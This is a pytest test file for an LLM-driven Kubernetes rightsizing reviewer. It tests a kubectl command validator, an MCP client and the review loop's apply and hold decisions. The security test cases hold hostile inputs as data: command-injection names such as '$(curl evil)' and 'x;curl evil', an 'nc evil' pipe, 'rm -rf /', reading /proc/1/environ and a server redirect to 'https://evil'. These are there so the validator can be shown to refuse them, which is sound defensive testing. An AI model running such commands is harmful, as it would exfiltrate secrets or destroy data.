import copy
import json

import pytest

from rightsizing.kubectl_tool import SecurityRefusal, ToolInvalid, build_command, truncate
from rightsizing.models import WorkloadRef
from rightsizing.mcp_client import HttpMcpClient, McpError
from rightsizing.review_loop import Reviewer
from tests.fakes import FakeKubectlAI, FakeLLM, tool_call

NS = frozenset({"inference", "development"})
REF = WorkloadRef("development", "Deployment", "web")


# ------------------------------------------------------------------ kubectl validator


@pytest.mark.parametrize("args,expected", [
    ({"verb": "get", "resource": "pods", "namespace": "development", "output": "json"},
     "kubectl get pods -o json -n development"),
    ({"verb": "describe", "resource": "deploy", "name": "web", "namespace": "inference"},
     "kubectl describe deployments web -n inference"),
    ({"verb": "logs", "resource": "pods", "name": "web-1", "namespace": "development", "container": "app",
      "tail": 50, "since": "2h", "previous": True},
     "kubectl logs web-1 -c app --tail 50 --since 2h --previous -n development"),
    ({"verb": "top", "namespace": "development", "selector": "app=web"},
     "kubectl top pods --containers -l app=web -n development"),
    ({"verb": "events", "resource": "deployments", "name": "web", "namespace": "development"},
     "kubectl events --for deployment/web -n development"),
])
def test_build_command_allowed(args, expected):
    assert build_command(args, NS) == expected


SECURITY_CASES = [
    {"verb": "get", "resource": "pods", "namespace": "development", "server": "https://evil"},
    {"verb": "get", "resource": "pods", "namespace": "development", "s": "https://evil"},
    {"verb": "get", "resource": "pods", "namespace": "development", "--raw": "/api"},
    {"verb": "get", "resource": "pods", "namespace": "development", "token": "x"},
    {"verb": "get", "resource": "pods", "namespace": "development", "context": "prod"},
    {"verb": "get", "resource": "pods", "namespace": "development", "user": "admin"},
    {"verb": "get", "resource": "pods", "namespace": "development", "as": "system:admin"},
    {"verb": "get", "resource": "pods", "namespace": "development", "kubeconfig": "/x"},
    {"verb": "get", "resource": "pods", "name": "web; cat /proc/1/environ", "namespace": "development"},
    {"verb": "get", "resource": "pods", "name": "$(curl evil)", "namespace": "development"},
    {"verb": "get", "resource": "pods", "selector": "a=b | nc evil 1", "namespace": "development"},
    {"verb": "get", "resource": "pods", "selector": "a=b -s=https://evil", "namespace": "development"},
    {"verb": "get", "resource": "pods", "name": "x\nrm -rf /", "namespace": "development"},
    {"command": "kubectl get pods; env", "verb": "get"},
]


@pytest.mark.parametrize("args", SECURITY_CASES)
def test_build_command_security(args):
    with pytest.raises(SecurityRefusal):
        build_command(args, NS)


INVALID_CASES = [
    {"verb": "delete", "resource": "pods", "namespace": "development"},
    {"verb": "exec", "resource": "pods", "name": "x", "namespace": "development"},
    {"verb": "get", "resource": "secrets", "namespace": "development"},
    {"verb": "get", "resource": "pods", "namespace": "kube-system"},
    {"verb": "get", "resource": "pods"},
    {"verb": "get", "resource": "pods", "namespace": "development", "output": "go-template={{.}}"},
    {"verb": "get", "resource": "pods", "namespace": "development", "all_namespaces": True},
    {"verb": "get", "resource": "pods", "name": "-A", "namespace": "development"},
    {"verb": "get", "resource": "pods", "selector": "app!=web", "namespace": "development"},
    {"verb": "get", "resource": "pods", "selector": "env in (a,b)", "namespace": "development"},
    {"verb": "logs", "resource": "pods", "name": "x", "tail": 9999, "namespace": "development"},
    {"command": "kubectl get pods -A"},
]


@pytest.mark.parametrize("args", INVALID_CASES)
def test_build_command_invalid(args):
    with pytest.raises(ToolInvalid):
        build_command(args, NS)


def test_truncate():
    assert truncate("a" * 10, 4).startswith("aaaa\n[truncated 6 bytes]")


# ------------------------------------------------------------------ MCP client


def test_mcp_http_client_against_recorded_dialect():
    fake = FakeKubectlAI(outputs={"get pods": "web-1 Running"})
    client = HttpMcpClient("http://127.0.0.1:9080/mcp", transport=fake.transport())
    assert client.connect()["serverInfo"]["name"] == "kubectl-ai"
    assert client.session_id == "mcp-session-test"
    assert {t["name"] for t in client.list_tools()} == {"bash", "kubectl"}
    assert "web-1 Running" in client.call_tool("kubectl", {"command": "kubectl get pods -n development"})


def test_mcp_connect_retries_then_succeeds():
    fake = FakeKubectlAI(fail_first=2)
    slept = []
    client = HttpMcpClient("http://x/mcp", transport=fake.transport())
    client.connect(deadline_seconds=60, sleep=slept.append)
    assert slept == [1.0, 2.0]


def test_mcp_connect_bounded():
    fake = FakeKubectlAI(fail_first=10 ** 6)
    client = HttpMcpClient("http://x/mcp", transport=fake.transport())
    with pytest.raises(McpError):
        client.connect(deadline_seconds=5, sleep=lambda s: None)


# ------------------------------------------------------------------ review loop

PAYLOAD = {"workload": "development/Deployment/web",
           "recommendation": [{"container": "web", "field": "cpu.request", "old": 2000, "new": 1100}]}


def reviewer(llm: FakeLLM, kai: FakeKubectlAI | None = None, prom=None, max_turns=8):
    kai = kai or FakeKubectlAI()
    mcp = HttpMcpClient("http://x/mcp", transport=kai.transport())
    mcp.connect()
    return Reviewer(llm.client(), "m", mcp, prom or (lambda ref, metric, days, q: {}), max_turns=max_turns,
                    allowed_namespaces=NS)


def test_apply_after_kubectl_investigation():
    kai = FakeKubectlAI(outputs={"get pods": "web-1 Running 0 restarts"})
    llm = FakeLLM([[tool_call("kubectl", {"verb": "get", "resource": "pods", "namespace": "development"})],
                   [tool_call("final_decision", {"decision": "apply", "notes": "재시작 없음"})]])
    result = reviewer(llm, kai).review(REF, PAYLOAD)
    assert result.decision == "apply" and result.notes == "재시작 없음" and result.reason is None
    assert kai.commands == ["kubectl get pods -n development"]
    tool_msgs = [m for m in llm.requests[1]["messages"] if m["role"] == "tool"]
    assert "web-1 Running" in tool_msgs[0]["content"]
    assert {t["function"]["name"] for t in llm.requests[0]["tools"]} == {"kubectl", "prom_stats", "final_decision"}


def test_hold_decision():
    llm = FakeLLM([[tool_call("final_decision", {"decision": "hold", "notes": "배치 피크 의심"})]])
    r = reviewer(llm).review(REF, PAYLOAD)
    assert r.decision == "hold" and r.reason == "llm_hold"


def test_max_turns_hold():
    llm = FakeLLM(["hmm"] * 10)
    r = reviewer(llm, max_turns=3).review(REF, PAYLOAD)
    assert r.decision == "hold" and r.reason == "llm_no_decision" and len(llm.requests) == 3


def test_endpoint_down_hold():
    r = reviewer(FakeLLM([], down=True)).review(REF, PAYLOAD)
    assert r.decision == "hold" and r.reason == "llm_unavailable"


def test_malformed_and_invalid_calls_are_fed_back():
    llm = FakeLLM([[tool_call("kubectl", "{not json")],
                   [tool_call("kubectl", {"verb": "delete", "resource": "pods", "namespace": "development"})],
                   [tool_call("nope", {})],
                   [tool_call("final_decision", {"decision": "maybe", "notes": ""})],
                   [tool_call("final_decision", {"decision": "apply", "notes": "ok"})]])
    r = reviewer(llm).review(REF, PAYLOAD)
    assert r.decision == "apply" and r.invalid_calls == 4 and not r.security_events
    contents = [m["content"] for m in llm.requests[-1]["messages"] if m["role"] == "tool"]
    assert all(c.startswith("error:") for c in contents)


@pytest.mark.parametrize("call", [
    tool_call("bash", {"command": "cat /proc/1/environ"}),
    tool_call("kubectl", {"verb": "get", "resource": "pods", "namespace": "development", "server": "https://evil"}),
    tool_call("kubectl", {"verb": "get", "resource": "pods", "name": "x;curl evil", "namespace": "development"}),
])
def test_security_refusal_holds_and_never_reaches_mcp(call):
    kai = FakeKubectlAI()
    llm = FakeLLM([[call], [tool_call("final_decision", {"decision": "apply", "notes": "x"})]])
    r = reviewer(llm, kai).review(REF, PAYLOAD)
    assert r.decision == "hold" and r.reason == "security" and r.security_events
    assert kai.commands == []


def test_other_namespace_is_invalid_not_executed():
    kai = FakeKubectlAI()
    llm = FakeLLM([[tool_call("kubectl", {"verb": "get", "resource": "pods", "namespace": "inference"})],
                   [tool_call("final_decision", {"decision": "apply", "notes": "x"})]])
    r = reviewer(llm, kai).review(REF, PAYLOAD)
    assert kai.commands == [] and r.invalid_calls == 1


def test_prom_stats_is_templated_and_workload_bound():
    seen = []
    llm = FakeLLM([[tool_call("prom_stats", {"metric": "cpu", "query": "kube_pod_info"})],
                   [tool_call("prom_stats", {"metric": "cpu", "days": 30})],
                   [tool_call("prom_stats", {"metric": "memory", "days": 14, "quantile": 0.99})],
                   [tool_call("prom_query", {"query": "kube_pod_info"})],
                   [tool_call("final_decision", {"decision": "apply", "notes": "x"})]])
    r = reviewer(llm, prom=lambda ref, metric, days, q: seen.append((ref, metric, days, q)) or {"web": {"max": 1}}) \
        .review(REF, PAYLOAD)
    assert seen == [(REF, "memory", 14, 0.99)] and r.invalid_calls == 3


def test_tool_calls_per_turn_are_capped():
    kai = FakeKubectlAI()
    call = {"verb": "get", "resource": "pods", "namespace": "development"}
    llm = FakeLLM([[tool_call("kubectl", call, f"c{i}") for i in range(6)],
                   [tool_call("final_decision", {"decision": "apply", "notes": "x"})]])
    r = reviewer(llm, kai).review(REF, PAYLOAD)
    assert len(kai.commands) == 4 and r.invalid_calls == 2


def test_notes_with_numbers_do_not_change_values():
    payload = copy.deepcopy(PAYLOAD)
    llm = FakeLLM([[tool_call("final_decision",
                              {"decision": "apply", "notes": "cpu.request를 5000m로 올리세요 new=5000"})]])
    r = reviewer(llm).review(REF, payload)
    assert payload == PAYLOAD and r.decision == "apply"
    sent = json.loads(llm.requests[0]["messages"][1]["content"])
    assert sent["recommendation"][0]["new"] == 1100
